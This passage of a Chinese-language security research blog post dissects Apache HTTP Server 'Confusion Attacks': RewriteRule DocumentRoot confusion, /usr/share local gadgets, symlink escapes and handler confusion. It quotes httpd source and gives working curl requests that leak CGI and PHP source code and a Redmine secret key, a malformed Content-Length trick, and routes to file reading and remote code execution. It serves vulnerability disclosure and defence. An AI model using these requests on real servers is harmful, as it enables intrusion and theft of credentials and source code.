答案是 —— **兩個路徑都會存取**。 這也是我們的第二個 Confusion Attack， **對於任意\[1\]的 `RewriteRule`，Httpd 總是會嘗試開啟帶有 DocumentRoot 的路徑以及沒有的路徑！** 有趣吧 😉

_\[1\] 位於 `Server Config` 或 `VirtualHost Block` 內_

_**Path: [modules/mappers/mod\_rewrite.c#L4939](https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939)**_

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>``` | ```<br>    if(!(conf->options & OPTION_LEGACY_PREFIX_DOCROOT)) {<br>        uri_reduced = apr_table_get(r->notes, "mod_rewrite_uri_reduced");<br>    }<br>    if (!prefix_stat(r->filename, r->pool) || uri_reduced != NULL) {     // <------ [1] access without root<br>        int res;<br>        char *tmp = r->uri;<br>        r->uri = r->filename;<br>        res = ap_core_translate(r);             // <------ [2] access with root<br>        r->uri = tmp;<br>        if (res != OK) {<br>            rewritelog((r, 1, NULL, "prefixing with document_root of %s"<br>                        " FAILED", r->filename));<br>            return res;<br>        }<br>        rewritelog((r, 2, NULL, "prefixed with document_root to %s",<br>                    r->filename));<br>    }<br>    rewritelog((r, 1, NULL, "go-ahead with %s [OK]", r->filename));<br>    return OK;<br>}<br>``` |

當然絕大部分的情況是目標檔案不存在，於是 Httpd 會存取帶有 DocumentRoot 的版本，但這個行為已經讓我們能夠「故意的」去存取 Web Root 以外的路徑， **如果今天可以控制 `RewriteRule` 的目標前綴那我們是不是就能瀏覽作業系統上的任意檔案了？** 這也是我們第二個 Confusion Attack 的精神！ 從 GitHub 中可以找到千千萬萬個有問題的寫法，有趣的是甚至連 [官方的範例文件](https://httpd.apache.org/docs/current/rewrite/remapping.html#rewrite-query) 都是易遭受攻擊的：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>``` | ```<br># Remove mykey=???<br>RewriteCond "%{QUERY_STRING}" "(.*(?:^|&))mykey=([^&]*)&?(.*)&?$"<br>RewriteRule "(.*)" "$1?%1%3"<br>``` |

除此之外還有其它亦受影響的 `RewriteRule` 例如基於快取需求或是將想副檔名隱藏起來的 URL Masking 規則：

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>RewriteRule  "^/html/(.*)$"  "/$1.html"<br>``` |

或是想節省流量，嘗試使用壓縮版本的靜態檔案規則：

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>RewriteRule  "^(.*)\.(css|js|ico|svg)" "$1\.$2.gz"<br>``` |

將老舊的網站轉址到根目錄的規則：

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>RewriteRule  "^/oldwebsite/(.*)$"  "/$1"<br>``` |

對所有 CORS 的預檢請求都回傳 200 OK 的規則：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br>RewriteCond %{REQUEST_METHOD} OPTIONS<br>RewriteRule ^(.*)$ $1 [R=200,L]<br>``` |

理論上只要 `RewriteRule` 的目標前綴可控，我們可以瀏覽幾乎整個檔案系統，但從前面的規則中發現還有一個限制我們必須跨過的，前面例子中所出現的副檔名如 `.html` 以及 `.gz` 的後綴都是讓我們沒那麼地自由的一個限制 —— 所以可以繞過這個限制嗎？ 不知道有沒有人想起前面在 Filename Confusion 章節所介紹的路徑截斷，透過這兩個攻擊的結合，我們可以自由的瀏覽作業系統上的任意檔案！

接下來的範例都基於這個不安全的 `RewriteRule` 來做示範：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br>RewriteEngine On<br>RewriteRule  "^/html/(.*)$"  "/$1.html"<br>``` |

### [⚔️ Primitive 2-1. Server-Side Source Code Disclosure](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9A%94%EF%B8%8F-Primitive-2-1-Server-Side-Source-Code-Disclosure "⚔️ Primitive 2-1. Server-Side Source Code Disclosure") ⚔️ Primitive 2-1. Server-Side Source Code Disclosure

首先來介紹 DocumentRoot Confusion 的第一個攻擊手法 —— **任意伺服器端程式碼洩漏**！

由於 Httpd 會根據當前目錄或是當前虛擬主機設定決定是否當成 Server-Side Script 處理，因此透過絕對路徑去存取目標程式碼可以混淆 Httpd 的邏輯導致洩漏原本該被當成程式碼執行的檔案內容。

#### [✔️ 2-1-1. Disclose CGI Source Code](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-2-1-1-Disclose-CGI-Source-Code "✔️ 2-1-1. Disclose CGI Source Code") ✔️ 2-1-1. Disclose CGI Source Code

首先是洩漏伺服器端的 CGI 程式碼，由於 `mod_cgi` 是透過 `ScriptAlias` 將 CGI 目錄與所指定的 URL 前綴綁定起來，當使用絕對路徑直接瀏覽 CGI 時由於 URL 前綴變了，因此可以直接洩漏出檔案原始碼。

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>``` | ```<br>$ curl http://server/cgi-bin/download.cgi<br> # the processed result from download.cgi<br>$ curl http://server/html/usr/lib/cgi-bin/download.cgi%3F<br> # #!/usr/bin/perl<br> # use CGI;<br> # ...<br> # # the source code of download.cgi<br>``` |

#### [✔️ 2-1-2. Disclose PHP Source Code](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-2-1-2-Disclose-PHP-Source-Code "✔️ 2-1-2. Disclose PHP Source Code") ✔️ 2-1-2. Disclose PHP Source Code

接著是洩漏伺服器端的 PHP 程式碼，由於 PHP 的使用場景眾多，若只針對特定目錄或是虛擬主機套用 PHP 環境的話 (常見於網站代管服務)，可以透過未啟用 PHP 的虛擬主機存取 PHP 檔案以洩漏原始碼！

例如 `www.local` 以及 `static.local` 兩個虛擬主機都託管在同一台伺服器上，`www.local` 允許運行 PHP 而 `static.local` 則純粹負責處理靜態檔案，因此可以透過下面的方式洩漏出 `config.php` 內的敏感資訊：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br>$ curl http://www.local/config.php<br> # the processed result (empty) from config.php<br>$ curl http://www.local/var/www.local/config.php%3F -H "Host: static.local"<br> # the source code of config.php<br>``` |

### [⚔️ Primitive 2-2. Local Gadgets Manipulation!](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9A%94%EF%B8%8F-Primitive-2-2-Local-Gadgets-Manipulation "⚔️ Primitive 2-2. Local Gadgets Manipulation!") ⚔️ Primitive 2-2. Local Gadgets Manipulation!

接下來是我們的第二個攻擊手法 —— **Local Gadgets Manipulation**。

首先，在前面介紹到「瀏覽作業系統上的任意檔案」時不知道你有沒有好奇： 「欸那是不是一個不安全的 `RewriteRule` 就可以存取到 `/etc/passwd`？」 對的 —— 但也不完全對。 蛤？

技術上來說確實伺服器會去檢查 `/etc/passwd` 是否存在，但 Apach HTTP Server 內建的存取控制阻擋了我們的存取，這裡是 Apache HTTP Server 的 [設定檔模板內容](https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115)：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br><Directory /><br>    AllowOverride None<br>    Require all denied<br></Directory><br>``` |

會觀察到預設阻擋了根目錄 `/` 的瀏覽 (`Require all denied`)，然而實際上這就沒戲了嗎？ 實際上再詳細追查各個 Httpd 的發行版會發現 [Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165) 作業系統預設允許了 `/usr/share`：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>``` | ```<br><Directory /usr/share><br>    AllowOverride None<br>    Require all granted<br></Directory><br>``` |

所以我們的「任意檔案存取」似乎有點那麼地不任意。 不過我們打破原本只能瀏覽 DocumentRoot 的信任算是跨出很大的一步了。 接下來要做的事情就是「壓榨」這個目錄內的各種可能。　所有可利用的資源、目錄中現有的教學範例、說明文件、單元測試檔案，甚至伺服器上程式語言如 PHP、Python 甚至 PHP 的模組都有機會成為我們濫用的對象！

_P.S. 當然上面只是基於 Ubuntu/Debian 作業系統發行的 Httpd 版本設定做解釋，實務上也有發現一些應用軟體直接把的根目錄的 `Require all denied` 移除導致可以直接存取 `/etc/passwd`_

![](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/92f358a5ab548ae0-04.png)

#### [✔️ 2-2-1. Local Gadget to Information Disclosure](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-2-2-1-Local-Gadget-to-Information-Disclosure "✔️ 2-2-1. Local Gadget to Information Disclosure") ✔️ 2-2-1. Local Gadget to Information Disclosure

首先來尋找看看這個目錄下是否存在這一些檔案是可以利用的。 首先是目標 Apache HTTP Server 如果安裝 `websocketd` 這個服務的話，服務套件預設會在 `/usr/share/doc/websocketd/examples/php/` 下放置一個範例 PHP 程式碼 `dump-env.php`，如果目標伺服器上存在 PHP 環境的話可以直接存取這個範例程式去洩漏敏感的環境變數。

另外如果目標同時安裝如 Nginx 或是 Jetty 的話，雖然 `/usr/share` 理論上該是套件安裝時所存放的唯讀複本，但這些服務的預設 Web Root 就在 `/usr/share` 下，因此也能透過這個攻擊手法去洩漏這些網頁應用的敏感資訊，例如 Jetty 上的 `web.xml` 設定等等：

- /usr/share/nginx/html/
- /usr/share/jetty9/etc/
- /usr/share/jetty9/webapps/

這裡簡單展示一個透過存取 `Davical` 套件所存在的 `setup.php` 唯讀複本去洩漏 `phpinfo()` 內容。

![](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/b891865923d68362-05.png)

#### [✔️ 2-2-2. Local Gadget to XSS](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-2-2-2-Local-Gadget-to-XSS "✔️ 2-2-2. Local Gadget to XSS") ✔️ 2-2-2. Local Gadget to XSS

接著如何把這個攻擊手法轉化成 XSS 呢？ 在 Ubuntu Desktop 環境中預設會安裝 LibreOffice 這套開源的辦公室應用，利用其中幫助文件的語言切換功能來完成 XSS。

_**Path: /usr/share/libreoffice/help/help.html**_

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>``` | ```<br>var url = window.location.href;<br>var n = url.indexOf('?');<br>if (n != -1) {<br>    // the URL came from LibreOffice help (F1)<br>    var version = getParameterByName("Version", url);<br>    var query = url.substr(n + 1, url.length);<br>    var newURL = version + '/index.html?' + query;<br>    window.location.replace(newURL);<br>} else {<br>    window.location.replace('latest/index.html');<br>}<br>``` |

因此就算目標沒有部署任何網頁應用，我們也可以利用一個不安全的 `RewriteRule` 透過作業系統自帶的檔案來創造出 XSS。

![](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/7ca2c0badb60f2df-06.png)

#### [✔️ 2-2-3. Local Gadget to LFI](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-2-2-3-Local-Gadget-to-LFI "✔️ 2-2-3. Local Gadget to LFI") ✔️ 2-2-3. Local Gadget to LFI

至於任意檔案讀取呢？ 如果目標伺服器上安裝了一些 PHP 甚至前端應用套件，例如 JpGraph、jQuery-jFeed 甚至 WordPress 或 Moodle 外掛，那麼它們自帶的使用教學或是除錯用程式碼都可以變成利用的對象，例如：

- /usr/share/doc/libphp-jpgraph-examples/examples/show-source.php
- /usr/share/javascript/jquery-jfeed/proxy.php
- /usr/share/moodle/mod/assignment/type/wims/getcsv.php

這裡展示利用 jQuery-jFeed 所自帶的 `proxy.php` 來讀取 `/etc/passwd`：

![](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/59b47f0ae6d8d13b-07.png)

#### [✔️ 2-2-4. Local Gadget to SSRF](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-2-2-4-Local-Gadget-to-SSRF "✔️ 2-2-4. Local Gadget to SSRF") ✔️ 2-2-4. Local Gadget to SSRF

當然找到一個 SSRF 也不在話下，例如 MagpieRSS 提供了一個 `magpie_debug.php` 檔案就是一個絕佳的小工具：

- /usr/share/php/magpierss/scripts/magpie\_debug.php

#### [✔️ 2-2-5. Local Gadget to RCE](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-2-2-5-Local-Gadget-to-RCE "✔️ 2-2-5. Local Gadget to RCE") ✔️ 2-2-5. Local Gadget to RCE

所以能 RCE 嗎？ 別急我們先慢慢來！ 首先這個攻擊手法已經可以把既有的攻擊面全部重新套用一次了，例如在某次開發過程中不小心被遺留下來 (甚至可能還是被第三方套件所依賴的) 的舊版本 PHPUnit，可以直接使用 [CVE-2017-9841](https://github.com/vulhub/vulhub/tree/master/phpunit/CVE-2017-9841) 來執行任意程式碼，又或者是安裝完 phpLiteAdmin (由於是唯讀副本所以預設密碼是 `admin`)，相信看到這邊會發現 Local Gadgets Manipulation 這個攻擊手法存在著無窮潛力，剩下只是發掘出更厲害以及更通用的小工具！

### [⚔️ Primitive 2-3. Jailbreak from Local Gadgets](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9A%94%EF%B8%8F-Primitive-2-3-Jailbreak-from-Local-Gadgets "⚔️ Primitive 2-3. Jailbreak from Local Gadgets") ⚔️ Primitive 2-3. Jailbreak from Local Gadgets

看到這裡你可能會好奇： 「真的不能跳出 `/usr/share` 嗎？」 當然可以，這也是要介紹的第三個攻擊手法 —— **從 `/usr/share` 中越獄！**

[Debian/Ubuntu](https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L160) 的 Httpd 發行版中預設開啟了 `FollowSymLinks` 選項，就算非 Debian/Ubuntu 發行版但 Apache HTTP Server 也隱含地預設 [允許符號連結](https://httpd.apache.org/docs/current/mod/core.html#options)。

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br><Directory /><br>    Options FollowSymLinks<br>    AllowOverride None<br>    Require all denied<br></Directory><br>``` |

#### [✔️ 2-3-1. Jailbreak from Local Gadgets](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-2-3-1-Jailbreak-from-Local-Gadgets "✔️ 2-3-1. Jailbreak from Local Gadgets") ✔️ 2-3-1. Jailbreak from Local Gadgets

因此只要有套件在它的安裝目錄下符號連結到 `/usr/share` 外，這個符號連結就成為一個跳板去存取更多的小工具完成更多的利用。 這裡列出一些我們已經發現可利用的符號連結：

- **Cacti Log**: `/usr/share/cacti/site/` -\> `/var/log/cacti/`
- **Solr Data**: `/usr/share/solr/data/` -\> `/var/lib/solr/data`
- **Solr Config**: `/usr/share/solr/conf/` -\> `/etc/solr/conf/`
- **MediaWiki Config**: `/usr/share/mediawiki/config/` -\> `/var/lib/mediawiki/config/`
- **SimpleSAMLphp Config**: `/usr/share/simplesamlphp/config/` -\> `/etc/simplesamlphp/`

#### [✔️ 2-3-2. Jailbreak Local Gadgets to Redmine RCE](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-2-3-2-Jailbreak-Local-Gadgets-to-Redmine-RCE "✔️ 2-3-2. Jailbreak Local Gadgets to Redmine RCE") ✔️ 2-3-2. Jailbreak Local Gadgets to Redmine RCE

越獄攻擊手法的最後讓我們展示一個利用 Redmine 的雙層符號連結跳躍去完成 RCE 的例子。 在預設安裝的 Redmine 程式碼目錄中有個 `instances/` 目錄指向 `/var/lib/redmine/`，而位於 `/var/lib/redmine/` 下的 `default/config/` 目錄又指向 `/etc/redmine/default/` 資料夾，裡面存放著 Redmine 的資料庫設定以及應用程式私密金鑰。

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>``` | ```<br>$ file /usr/share/redmine/instances/<br> symbolic link to /var/lib/redmine/<br>$ file /var/lib/redmine/config/<br> symbolic link to /etc/redmine/default/<br>$ ls /etc/redmine/default/<br> database.yml    secret_key.txt<br>``` |

於是透過一個不安全的 `RewriteRule` 以及兩層符號連結，我們能夠輕鬆存取到 Redmine 所使用的應用程式金鑰：

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br>$ curl http://server/html/usr/share/redmine/instances/default/config/secret_key.txt%3f<br> HTTP/1.1 200 OK<br> Server: Apache/2.4.59 (Ubuntu) <br> ...<br> 6d222c3c3a1881c865428edb79a74405<br>``` |

而 Redmine 又是基於 Ruby on Rails 所開發的應用程式，其中 `secret_key.txt` 的內容其實正是其簽章加密所使用到的金鑰，接下來的流程相信對 [熟悉攻擊 RoR 的同學](https://drive.google.com/file/d/1UMxphxFxwRf7wbrw4_Hr56KGPzpLU3Ef/view) 應該不陌生，透過已知的金鑰將惡意 Marshal 物件簽章加密後嵌入 Cookie，接著透過伺服器端的反序列化最終實現遠端程式碼執行！

![](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/9f927a5ccd4a2a69-08.png)

## [🔥 3. Handler Confusion](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%F0%9F%94%A5-3-Handler-Confusion "🔥 3. Handler Confusion") 🔥 3\. Handler Confusion

最後一個要介紹的攻擊是 Handler 上的 Confusion。 這個攻擊同樣也利用了一個 Apache HTTP Server 從上古時期架構所遺留下來的技術債。這裡透過一個例子來讓讀者快速的了解這個技術債 —— 如果今天想在 Httpd 上運行經典的 `mod_php`，下面兩個語法設定你覺得哪個才是正確的？

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br>AddHandler application/x-httpd-php .php<br>AddType    application/x-httpd-php .php<br>``` |

答案是 —— 兩個都可以正確地讓 PHP 運行起來！ 這裡分別是兩個設定的語法格式，可以看到兩個設定不僅用法、參數類似，現在連效果都一模一樣，為什麼 Apache HTTP Server 當初要設計兩個不同的語法？

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br>AddHandler handler-name extension [extension] ...<br>AddType media-type extension [extension] ...<br>``` |

實際上 `handler-name` 以及 `media-type` 在 Httpd 的內部結構中代表著不同的欄位，分別對應到 `r->handler` 以及 `r->content_type`。 而 **使用者可以在沒有感知的情況下使用則歸功於一段從 [1996 年](https://svn.apache.org/repos/asf/httpd/httpd/branches/1.3.x/src/main/http_config.c) Apache HTTP Server 開發初期就遺留到現在的程式碼**：

_**Path: [server/config.c#L420](https://github.com/apache/httpd/blob/2.4.58/server/config.c#L420)**_

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>``` | ```<br>AP_CORE_DECLARE(int) ap_invoke_handler(request_rec *r) {<br>    // [...]<br>    if (!r->handler) {<br>        if (r->content_type) {<br>            handler = r->content_type;<br>            if ((p=ap_strchr_c(handler, ';')) != NULL) {<br>                char *new_handler = (char *)apr_pmemdup(r->pool, handler,<br>                                                        p - handler + 1);<br>                char *p2 = new_handler + (p - handler);<br>                handler = new_handler;<br>                /* exclude media type arguments */<br>                while (p2 > handler && p2[-1] == ' ')<br>                    --p2; /* strip trailing spaces */<br>                *p2='\0';<br>            }<br>        }<br>        else {<br>            handler = AP_DEFAULT_HANDLER_NAME;<br>        }<br>        r->handler = handler;<br>    }<br>    result = ap_run_handler(r);<br>``` |

可以看到在進入主要的模組處理器 `ap_run_handler()` 之前，如果請求中的 `r->handler` 為空則把結構中 `r->content_type` 欄位的內容當成最終將被使用的模組處理器。 這也就是為什麼 `AddType` 以及 `AddHandler` 效果一致的主要理由，因為 `media-type` 最終在執行前還是會被轉換成 `handler-name`。 我們的第三個 Handler Confusion 主要也就是圍繞在這個行為所發展出來的攻擊。

### [⚔️ Primitive 3-1. Overwrite the Handler](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9A%94%EF%B8%8F-Primitive-3-1-Overwrite-the-Handler "⚔️ Primitive 3-1. Overwrite the Handler") ⚔️ Primitive 3-1. Overwrite the Handler

在理解這個轉換機制後首先第一個攻擊手法是 —— **Overwrite the Handler**，想像一下如果今天目標的 Apache HTTP Server 透過 `AddType` 將 PHP 運行起來。

|     |     |
| --- | --- |
| ```<br>1<br>``` | ```<br>AddType application/x-httpd-php  .php<br>``` |

在正常的流程中瀏覽 `http://server/config.php`。 首先，`mod_mime` 會在 `type_checker` 階段根據 `AddType` 所設定的附檔名將相對應的內容複製到 `r->content_type` 中，由於 `r->handler` 在整個 HTTP 生命週期中並無賦值，於是在執行模組處理器前 `ap_invoke_handler()` 會將 `r->content_type` 當成模組處理器，最終呼叫 `mod_php` 處理請求。

然而如果今天有任何模組在執行到 `ap_invoke_handler()` 前「不小心」把 `r->content_type` 覆寫掉了，那會發生什麼事呢？

#### [✔️ 3-1-1. Overwrite Handler to Disclose PHP Source Code](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-3-1-1-Overwrite-Handler-to-Disclose-PHP-Source-Code "✔️ 3-1-1. Overwrite Handler to Disclose PHP Source Code") ✔️ 3-1-1. Overwrite Handler to Disclose PHP Source Code

因此這個攻擊手法的第一個利用就是透過這個「不小心」去洩漏任意 PHP 的原始碼。 這個技術最早是由 Max Dmitriev 在 ZeroNights 2021 所發表的研究中提及 (kudos to him!)，演講主題及投影片可以從這邊看到：

> [Apache 0day bug, which still nobody knows of, and which was fixed accidentally](https://web.archive.org/web/20210909012535/https://zeronights.ru/wp-content/uploads/2021/09/013_dmitriev-maksim.pdf)

Max Dmitriev 觀察到只要送出錯誤的 `Content-Length`，遠端 Httpd 伺服器會發生不明的錯誤順帶回傳 PHP 的原始碼，在細追流程後發現其成因是 ModSecurity 在使用 APR (Apache Portable Runtime) 函示庫時並未好好的處理 `AP_FILTER_ERROR` 回傳值所導致的 [double response](https://github.com/owasp-modsecurity/ModSecurity/issues/2514)。 由於發生錯誤時 Httpd 想送出一些 HTML 錯誤訊息，於是 `r->content_type` 也順便被覆寫成 `text/html`。

![](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/0bc450787c481aef-09.png)

由於 ModSecurity 並未妥善的處理回傳值使得本該停止的 Httpd 內部流程繼續執行，而這個「副作用」又會把原本加上的 `Content-Type` 給覆寫掉，導致最終該被當成 PHP 的檔案被當成一般文件處理並將其中的程式碼及敏感設定印出。 🤫

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>``` | ```<br>$ curl -v http://127.0.0.1/info.php -H "Content-Length: x"<br>> HTTP/1.1 400 Bad Request<br>> Date: Mon, 29 Jul 2024 05:32:23 GMT<br>> Server: Apache/2.4.41 (Ubuntu)<br>> Content-Type: text/html; charset=iso-8859-1<br><!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><br><html><head><br><title>400 Bad Request</title><br>...<br><?php phpinfo();?><br>``` |

理論上所有基於 `Content-Type` 的設定語法都容易遭受此類問題影響，所以除了 Max 在投影片中所展示的 `php-cgi` 搭配 `mod_actions` 外，純粹的 `mod_php` 搭配上 `AddType` 也同樣也受影響。

另外值得一提的是，這個副作用在 Apache HTTP Server 版本 2.4.44 時被當成一個 [增進請求解析器](https://github.com/apache/httpd/commit/3303dc4f7273e05ea9a80402b33f68cd155c146a) 的程式錯誤被更正，於是這個「漏洞」就被當成已修復直到我重新撿起它。 但由於其根本成因還是 ModSecurity 並未好好的處理錯誤，只要找到其它條觸發 `AP_FILTER_ERROR` 的路徑那同樣的行為還是可以重現成功。

_P.S. 此問題已於 6/20 透過官方信箱回報給 ModSecurity 並由 Project Co-Leader 建議回到原 [GitHub Issue](https://github.com/owasp-modsecurity/ModSecurity/issues/2514) 中討論。_

#### [✔️ 3-1-2. Overwrite Handler to ██████ ███████ ██████](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9C%94%EF%B8%8F-3-1-2-Overwrite-Handler-to-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88-%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88 "✔️ 3-1-2. Overwrite Handler to ██████ ███████ ██████") ✔️ 3-1-2. Overwrite Handler to ██████ ███████ ██████

基於前面提到的 [double response](https://github.com/owasp-modsecurity/ModSecurity/issues/2514) 行為以及副作用，這個攻擊手法還可以完成其它更酷的利用，不過由於此問題尚未完全修復，更進一步的利用方式，將於修復完成後再揭露。

### [⚔️ Primitive 3-2. Invoke Arbitrary Handlers](https://blog.orange.tw/posts/2024-08-confusion-attacks-ch/\#%E2%9A%94%EF%B8%8F-Primitive-3-2-Invoke-Arbitrary-Handlers "⚔️ Primitive 3-2. Invoke Arbitrary Handlers") ⚔️ Primitive 3-2. Invoke Arbitrary Handlers

仔細思考前面 Overwrite Handler 攻擊手法，雖然是因為 ModSecurity 並未好好的處理錯誤，導致請求被設置上錯誤的 `Content-Type`。 但再深入的探究其根本原因應該是 —— **Apache HTTP Server 在使用 `r->content_type` 時，其實無從辨別它的語意，這個欄位既可以是在請求階段被語法設定好的值，也可以是回應階段伺服器回傳 `Content-Type` 標頭的內容。**

所以理論上如果能控制伺服器回應中 `Content-Type` 標頭的內容，那就可以透過那段從開發初期遺留至今的程式碼呼叫任意的模組處理器，這也是 Handler Confusion 的最後一個攻擊手法 —— **呼叫任意 Apache HTTP Server 的內部模組處理器**！

但這裡還有最後的一塊拼圖必須填上，在 Httpd 中所有可以從伺服器回應修改到 `r->content_type` 的地方全都發生在那段遺留程式碼之後，就算修改到該欄位的內容，此時 HTTP 生命週期也進入尾聲，無法再做更進一步的利用…… 嗎？

我們找了 [RFC 3875](https://datatracker.ietf.org/doc/html/rfc3875) 來當救援投手！ RFC 3875 是一個關於 CGI 的規範，其中 [6.2.2. 節](https://datatracker.ietf.org/doc/html/rfc3875#section-6.2.2) 定義了一個 Local Redirect Response 行為:

> The CGI script can return a URI path and query-string (‘local-pathquery’) for a local resource in a Location header field. This indicates to the server that it should reprocess the request using the path specified.

簡單來說規範了 CGI 在特定條件下必須使用伺服器端的資源去處理轉址，仔細檢視 `mod_cgi` 對於這個規範的實作會發現：

_**Path: [modules/generators/mod\_cgi.c#L983](https://github.com/apache/httpd/blob/2.4.58/modules/generators/mod_cgi.c#L983)**_

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>``` | ```<br>if ((ret = ap_scan_script_header_err_brigade_ex(r, bb, sbuf,          // <------ [1]<br>                                                APLOG_MODULE_INDEX)))<br>{<br>    ret = log_script(r, conf, ret, dbuf, sbuf, bb, script_err);<br>    // [...]<br>    if (ret == HTTP_NOT_MODIFIED) {<br>        r->status = ret;<br>        return OK;<br>    }<br>    return ret;<br>}<br>location = apr_table_get(r->headers_out, "Location");<br>if (location && r->status == 200) {<br>    // [...]<br>}<br>if (location && location[0] == '/' && r->status == 200) {          // <------ [2]<br>    /* This redirect needs to be a GET no matter what the original<br>     * method was.<br>     */<br>    r->method = "GET";<br>    r->method_number = M_GET;<br>    /* We already read the message body (if any), so don't allow<br>     * the redirected request to think it has one.  We can ignore<br>     * Transfer-Encoding, since we used REQUEST_CHUNKED_ERROR.<br>     */<br>    apr_table_unset(r->headers_in, "Content-Length");<br>    ap_internal_redirect_handler(location, r);                     // <------ [3]<br>    return OK;<br>}<br>``` |

首先 `mod_cgi` 會先執行\[1\] CGI 並掃描其輸出結果並設置上相對應的 `Status` 以及 `Content-Type`，如果\[2\]回傳的 `Status` 是 200 以及 `Location` 標頭欄位是 `/` 開頭則把這個回應當成一個伺服器端的轉址並開始處理\[3\]。 再仔細審視 `ap_internal_redirect_handler()` 的實作會發現：

_**Path: [modules/http/http\_request.c#L800](https://github.com/apache/httpd/blob/2.4.58/modules/http/http_request.c#L800)**_

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>``` | ```<br>AP_DECLARE(void) ap_internal_redirect_handler(const char *new_uri, request_rec *r)<br>{<br>    int access_status;<br>    request_rec *new = internal_internal_redirect(new_uri, r);    // <------ [1]<br>    /* ap_die was already called, if an error occured */<br>    if (!new) {<br>        return;<br>    }<br>    if (r->handler)<br>        ap_set_content_type(new, r->content_type);                // <------ [2]<br>    access_status = ap_process_request_internal(new);             // <------ [3]<br>    if (access_status == OK) {<br>        access_status = ap_invoke_handler(new);                   // <------ [4]<br>    }<br>    ap_die(access_status, new);<br>}<br>``` |

Httpd 首先創建\[1\]了一個新的請求結構並將當前的 `r->content_type` 複\[2\]進去，在處\[3\]完生命週期後呼叫\[4\]`ap_invoke_handler()` —— 也就是前面提及包含歷史遺留轉換的地方，所以 **在伺服器端轉址中，如果可以控制回應標頭，就可以在 Httpd 中呼叫任意的模組處理器。** 基本上所有 Apache HTTP Server 中的 CGI 系列實作都遵守這個行為，這裡是一個簡單的列表：

- mod\_cgi
- mod\_cgid
- mod\_wsgi
- mod\_uwsgi
- mod\_fastcgi
- mod\_perl
- mod\_asis
- mod\_fcgid
- mod\_proxy\_scgi
- …

